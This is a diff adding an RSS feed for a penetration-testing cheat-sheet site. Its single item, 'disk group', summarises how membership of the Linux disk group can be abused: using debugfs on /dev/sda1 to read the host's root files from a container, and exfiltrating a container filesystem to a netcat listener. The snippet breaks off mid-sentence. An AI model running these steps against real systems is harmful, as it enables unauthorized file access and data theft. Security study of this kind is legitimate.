@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Disk on TLDRBins</title>
+    <link>https://tldrbins.github.io/@disk/</link>
+    <description>Recent content in Disk on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@disk/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>disk group</title>
+      <link>https://tldrbins.github.io/disk/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/disk/</guid>
+      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse #1: Read host&amp;rsquo;s filesystem from container (root) # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse #2: Read container&amp;rsquo;s filesystem from host # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.</description>
+    </item>
+  </channel>
+</rss>
